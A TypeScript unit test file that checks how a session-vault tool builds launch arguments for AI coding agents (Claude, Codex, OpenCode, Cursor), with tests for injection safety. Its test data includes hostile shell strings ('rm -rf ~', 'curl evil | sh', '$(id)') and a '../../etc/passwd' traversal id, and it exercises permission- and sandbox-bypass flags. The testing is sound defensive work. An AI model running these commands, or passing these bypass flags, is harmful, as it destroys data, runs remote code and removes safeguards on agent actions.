// src/vault/LaunchBuilder.test.ts — Unit tests for launch argv/env synthesis.

import { describe, expect, it } from "vitest";
import { build, buildResumeCommandString, buildStart, VaultLaunchError } from "./LaunchBuilder";
import type { VaultSessionEntry } from "./types";

function entry(overrides: Partial<VaultSessionEntry> = {}): VaultSessionEntry {
  return {
    id: "claude:sess-1",
    agent: "claude",
    sessionId: "sess-1",
    title: "t",
    cwd: "/Users/me/proj",
    modified: 1,
    flags: {},
    canFork: true,
    canResume: true,
    ...overrides,
  };
}

describe("build: claude", () => {
  it("resume argv injects model + permission-mode when present", () => {
    const spec = build(entry({ flags: { model: "claude-opus-4-7", permissionMode: "acceptEdits" } }), "resume", {});
    expect(spec.file).toBe("claude");
    expect(spec.args).toEqual(["--resume", "sess-1", "--model", "claude-opus-4-7", "--permission-mode", "acceptEdits"]);
    expect(spec.cwd).toBe("/Users/me/proj");
  });

  it("omits flags whose captured value is absent", () => {
    const spec = build(entry({ flags: {} }), "resume", {});
    expect(spec.args).toEqual(["--resume", "sess-1"]);
  });

  it("forwards only the allowlisted host env vars that are present", () => {
    const spec = build(entry(), "resume", {
      ANTHROPIC_API_KEY: "sk-123",
      ANTHROPIC_BASE_URL: "https://api",
      UNRELATED: "nope",
    });
    expect(spec.env).toEqual({ ANTHROPIC_API_KEY: "sk-123", ANTHROPIC_BASE_URL: "https://api" });
    expect(spec.env).not.toHaveProperty("UNRELATED");
  });

  it("a captured configDir overrides the host CLAUDE_CONFIG_DIR", () => {
    const spec = build(entry({ flags: { configDir: "/captured/config" } }), "resume", {
      CLAUDE_CONFIG_DIR: "/host/config",
    });
    expect(spec.env.CLAUDE_CONFIG_DIR).toBe("/captured/config");
  });

  it("fork uses --fork-session", () => {
    const spec = build(entry(), "fork", {});
    expect(spec.args).toEqual(["--resume", "sess-1", "--fork-session"]);
  });
});

describe("build: codex", () => {
  function codexEntry(flags: VaultSessionEntry["flags"]): VaultSessionEntry {
    return entry({ id: "codex:t1", agent: "codex", sessionId: "t1", cwd: "/c", flags });
  }

  it("preserves -m -a -s flag order and templates reasoning effort", () => {
    const spec = build(
      codexEntry({ model: "gpt-5-codex", approval: "on-request", sandbox: "workspace-write", reasoningEffort: "high" }),
      "resume",
      {},
    );
    expect(spec.args).toEqual([
      "resume",
      "t1",
      "-m",
      "gpt-5-codex",
      "-a",
      "on-request",
      "-s",
      "workspace-write",
      "-c",
      "model_reasoning_effort=high",
    ]);
  });

  it("non-claude agents get an empty env override", () => {
    const spec = build(codexEntry({}), "resume", { ANTHROPIC_API_KEY: "sk" });
    expect(spec.env).toEqual({});
  });

  it("codex fork argv", () => {
    const spec = build(codexEntry({}), "fork", {});
    expect(spec.args).toEqual(["fork", "t1"]);
  });
});

describe("build: injection safety (D9)", () => {
  it("a hostile session id stays a single inert argument", () => {
    const spec = build(entry({ sessionId: "a; rm -rf ~", id: "claude:a; rm -rf ~" }), "resume", {});
    // The dangerous string is exactly one argv element — no shell ever sees it.
    expect(spec.args).toContain("a; rm -rf ~");
    expect(spec.args.filter((a) => a.includes("rm -rf"))).toHaveLength(1);
  });

  it("a hostile flag value stays a single inert argument", () => {
    const spec = build(entry({ flags: { model: "x && curl evil | sh" } }), "resume", {});
    const idx = spec.args.indexOf("--model");
    expect(spec.args[idx + 1]).toBe("x && curl evil | sh");
  });
});

describe("build: continue", () => {
  it("claude takes the prompt as a positional argument", () => {
    const spec = build(entry(), "continue", {}, "continue from here");
    expect(spec.file).toBe("claude");
    expect(spec.args).toEqual(["continue from here"]);
    expect(spec.cwd).toBe("/Users/me/proj");
  });

  it("codex takes the prompt as a positional argument", () => {
    const spec = build(entry({ id: "codex:t1", agent: "codex", sessionId: "t1", cwd: "/c" }), "continue", {}, "go on");
    expect(spec.args).toEqual(["go on"]);
  });

  it("opencode takes the prompt behind --prompt", () => {
    const spec = build(
      entry({ id: "opencode:s1", agent: "opencode", sessionId: "s1", cwd: "/o" }),
      "continue",
      {},
      "go on",
    );
    expect(spec.args).toEqual(["--prompt", "go on"]);
  });

  it("keeps a prompt full of shell metacharacters as ONE inert argument", () => {
    const hostile = "fix it; rm -rf ~ && curl evil | sh `whoami` $(id)";
    const spec = build(entry(), "continue", {}, hostile);
    expect(spec.args).toEqual([hostile]);
  });

  it("still forwards the claude auth env", () => {
    const spec = build(entry(), "continue", { ANTHROPIC_API_KEY: "sk-123" }, "go on");
    expect(spec.env).toEqual({ ANTHROPIC_API_KEY: "sk-123" });
  });

  it("refuses a continue with no prompt", () => {
    try {
      build(entry(), "continue", {}, "   ");
      throw new Error("expected a VaultLaunchError");
    } catch (e) {
      expect((e as VaultLaunchError).code).toBe("no-prompt");
    }
  });

  // User feedback 7_1 — a continued session dropped to the agent's default
  // permission mode, so continuing a bypassing session silently downgraded it.
  // 8_5 moved the posture onto the dialog's choice (D11), so it leads the argv.
  it("carries the captured model and permission mode, with the prompt last", () => {
    const spec = build(
      entry({ flags: { model: "opus", permissionMode: "bypassPermissions" } }),
      "continue",
      {},
      "go on",
    );
    expect(spec.args).toEqual(["--permission-mode", "bypassPermissions", "--model", "opus", "go on"]);
  });

  it("resolves codex's captured sandbox to its own permission choice", () => {
    const spec = build(
      entry({
        id: "codex:t1",
        agent: "codex",
        sessionId: "t1",
        cwd: "/c",
        flags: { approval: "never", sandbox: "danger-full-access" },
      }),
      "continue",
      {},
      "go on",
    );
    expect(spec.args).toEqual(["--dangerously-bypass-approvals-and-sandbox", "go on"]);
  });

  it("carries the opencode model and agent", () => {
    const spec = build(
      entry({ id: "opencode:s1", agent: "opencode", sessionId: "s1", cwd: "/o", flags: { agent: "build" } }),
      "continue",
      {},
      "go on",
    );
    expect(spec.args).toEqual(["--agent", "build", "--prompt", "go on"]);
  });

  it("leaves resume and fork argv untouched", () => {
    expect(build(entry(), "resume", {}).args).toEqual(["--resume", "sess-1"]);
    expect(build(entry(), "fork", {}).args).toEqual(["--resume", "sess-1", "--fork-session"]);
  });
});

describe("build: cursor", () => {
  function cursorEntry(overrides: Partial<VaultSessionEntry> = {}): VaultSessionEntry {
    return entry({
      id: "cursor:chat-1",
      agent: "cursor",
      sessionId: "chat-1",
      cwd: "/cursor-project",
      canFork: false,
      canResume: false,
      ...overrides,
    });
  }

  it("uses the resolved executable and passes the handoff prompt as one positional argument", () => {
    const spec = build(cursorEntry(), "continue", {}, "continue this work", undefined, "cursor-agent");
    expect(spec.file).toBe("cursor-agent");
    expect(spec.args).toEqual(["continue this work"]);
    expect(spec.cwd).toBe("/cursor-project");
  });

  it("applies Cursor's explicitly selected full-access posture ahead of the prompt", () => {
    const spec = build(
      cursorEntry(),
      "continue",
      {},
      "continue this work",
      { permissionChoiceId: "force" },
      "cursor-agent",
    );
    expect(spec.args).toEqual(["--force", "continue this work"]);
  });

  it("fails rather than launching an unresolved Cursor executable", () => {
    expect(() => build(cursorEntry(), "continue", {}, "continue this work")).toThrow(
      expect.objectContaining({ code: "executable-not-found" }),
    );
  });

  it("uses the resolved executable for a proven selected resume", () => {
    const spec = build(
      cursorEntry({ source: "cli", canResume: true }),
      "resume",
      {},
      undefined,
      undefined,
      "cursor-agent",
    );
    expect(spec.file).toBe("cursor-agent");
    expect(spec.args).toEqual(["--resume", "chat-1"]);
  });

  it("rejects IDE, project, and forged Cursor Resume entries in the builder", () => {
    for (const unsupported of [
      cursorEntry({
        id: "cursor:ide:d29ya3NwYWNlLTE:composer-1",
        sessionId: "ide:d29ya3NwYWNlLTE:composer-1",
        source: "ide",
        canResume: false,
      }),
      cursorEntry({
        id: "cursor:project:cHJvamVjdC0x:chat-1",
        sessionId: "project:cHJvamVjdC0x:chat-1",
        canResume: false,
      }),
      cursorEntry({ canResume: true }),
      cursorEntry({ source: "ide", canResume: true }),
      // Canonical id/source/canResume but a forged, path-traversing chat id —
      // the canonical isSafeCursorChatId validator must still reject it.
      cursorEntry({
        id: "cursor:../../etc/passwd",
        sessionId: "../../etc/passwd",
        source: "cli",
        canResume: true,
      }),
      // Source-qualified and safe id, but the id no longer matches `cursor:${sessionId}`.
      cursorEntry({
        id: "cursor:some-other-id",
        sessionId: "chat-1",
        source: "cli",
        canResume: true,
      }),
    ]) {
      expect(() => build(unsupported, "resume", {}, undefined, undefined, "cursor-agent")).toThrow(
        expect.objectContaining({ code: "resume-unsupported" }),
      );
    }
  });

  it("accepts a fully canonical, source-qualified Cursor CLI Resume entry", () => {
    const spec = build(
      cursorEntry({ source: "cli", canResume: true }),
      "resume",
      {},
      undefined,
      undefined,
      "cursor-agent",
    );
    expect(spec.args).toEqual(["--resume", "chat-1"]);
  });
});

describe("buildResumeCommandString: complex-token quoting", () => {
  // 7_4 — the complex-token fallback delegates to the canonical
  // src/utils/posixShellQuote.ts helper, which must survive an apostrophe
  // embedded inside the quoted value (not just a wrapping space).
  it("single-quote wraps and escapes a flag value containing an apostrophe", async () => {
    const cmd = await buildResumeCommandString(entry({ flags: { model: "it's opus" } }));
    expect(cmd).toBe("claude --resume sess-1 --model 'it'\\''s opus'");
  });
});

describe("build: errors", () => {
  it("throws no-fork-command when forking an agent without a fork template", () => {
    // Construct a fake agent id with no registry record → unknown-agent path
    expect(() => build(entry({ agent: "ghost" }), "resume", {})).toThrow(VaultLaunchError);
    try {
      build(entry({ agent: "ghost" }), "resume", {});
    } catch (e) {
      expect((e as VaultLaunchError).code).toBe("unknown-agent");
    }
  });
});

// improve-vault-transcript-messages 8_5 — the continuation dialog picks the agent
// and the permission posture; the entry only supplies defaults (D11).
describe("build: continue with a chosen target", () => {
  it("expands the chosen posture's own args", () => {
    const spec = build(entry(), "continue", {}, "go on", { permissionChoiceId: "plan" });
    expect(spec.args).toEqual(["--permission-mode", "plan", "go on"]);
  });

  it("falls back to the posture the entry was captured under", () => {
    const spec = build(entry({ flags: { permissionMode: "bypassPermissions" } }), "continue", {}, "go on");
    expect(spec.args).toEqual(["--permission-mode", "bypassPermissions", "go on"]);
  });

  it("rejects an unknown explicit permission choice", () => {
    expect(() => build(entry(), "continue", {}, "go on", { permissionChoiceId: "stale-mode" })).toThrow(
      expect.objectContaining({ code: "unknown-permission-choice" }),
    );
  });

  it("uses the first visible safe choice for a stale captured posture", () => {
    const spec = build(entry({ flags: { permissionMode: "removed-mode" } }), "continue", {}, "go on");
    expect(spec.args).toEqual(["--permission-mode", "default", "go on"]);
  });

  it("starts a different agent when the reader picked one", () => {
    const spec = build(entry(), "continue", {}, "go on", { agent: "opencode" });
    expect(spec.file).toBe("opencode");
    expect(spec.args).toEqual(["--prompt", "go on"]);
    expect(spec.cwd).toBe("/Users/me/proj");
  });

  it("drops the source agent's captured flags when the target agent differs", () => {
    const spec = build(entry({ flags: { model: "opus", permissionMode: "bypassPermissions" } }), "continue", {}, "go", {
      agent: "codex",
      permissionChoiceId: "read-only",
    });
    expect(spec.args).toEqual(["-a", "untrusted", "-s", "read-only", "go"]);
  });

  it("forwards the claude auth env only when claude is the target", () => {
    const host = { ANTHROPIC_API_KEY: "sk-1" };
    expect(build(entry(), "continue", host, "go on").env).toEqual(host);
    expect(build(entry(), "continue", host, "go on", { agent: "codex" }).env).toEqual({});
  });

  it("refuses an agent that cannot be seeded with a prompt", () => {
    try {
      build(entry(), "continue", {}, "go on", { agent: "ghost" });
      throw new Error("expected a VaultLaunchError");
    } catch (e) {
      expect((e as VaultLaunchError).code).toBe("unknown-agent");
    }
  });
});

describe("buildStart", () => {
  const env = {} as Record<string, string | undefined>;

  it("emits no prompt argument at all when there is no prompt", () => {
    const spec = buildStart("claude", "/wt/feat", env, {});
    expect(spec.file).toBe("claude");
    expect(spec.args).toEqual([]);
    expect(spec.args).not.toContain("");
    expect(spec.cwd).toBe("/wt/feat");
  });

  it("puts the prompt last, after the posture the user chose", () => {
    const spec = buildStart("claude", "/wt/feat", env, {
      permissionChoiceId: "acceptEdits",
      prompt: "ship the thing",
    });
    expect(spec.args).toEqual(["--permission-mode", "acceptEdits", "ship the thing"]);
  });

  it("carries opencode's prompt behind its flag, and drops the flag with the text", () => {
    expect(buildStart("opencode", "/wt/feat", env, { prompt: "go" }).args).toEqual(["--prompt", "go"]);
    expect(buildStart("opencode", "/wt/feat", env, {}).args).toEqual([]);
  });

  it("refuses a prompt the agent would parse as an option", () => {
    // A single argv token stops SHELL injection, not CLI option parsing: claude
    // takes its prompt positionally beside --permission-mode, so this would
    // silently replace the posture the user picked.
    expect(() => buildStart("claude", "/wt/feat", env, { permissionChoiceId: "plan", prompt: "--force" })).toThrow(
      VaultLaunchError,
    );
    expect(() =>
      buildStart("codex", "/wt/feat", env, { prompt: "--dangerously-bypass-approvals-and-sandbox" }),
    ).toThrow(/option/i);
  });

  it("applies no posture when the launch names none — a fresh session has nothing captured", () => {
    expect(buildStart("codex", "/wt/feat", env, {}).args).toEqual([]);
  });

  it("rejects a posture the chosen agent does not declare", () => {
    expect(() => buildStart("claude", "/wt/feat", env, { permissionChoiceId: "danger-full-access" })).toThrow(
      VaultLaunchError,
    );
  });

  it("rejects an agent with no start command of its own", () => {
    expect(() => buildStart("nosuch", "/wt/feat", env, {})).toThrow(VaultLaunchError);
  });

  it("forwards only Claude's auth allowlist, and nothing for other agents", () => {
    const hostEnv = { ANTHROPIC_API_KEY: "k", HOME: "/home/me", SECRET: "s" };
    expect(buildStart("claude", "/wt/feat", hostEnv, {}).env).toEqual({ ANTHROPIC_API_KEY: "k" });
    expect(buildStart("codex", "/wt/feat", hostEnv, {}).env).toEqual({});
  });

  it("resolves a templated executable, and refuses when it cannot", () => {
    expect(buildStart("cursor", "/wt/feat", env, { executable: "/usr/bin/cursor-agent" }).file).toBe(
      "/usr/bin/cursor-agent",
    );
    expect(() => buildStart("cursor", "/wt/feat", env, {})).toThrow(VaultLaunchError);
  });
});
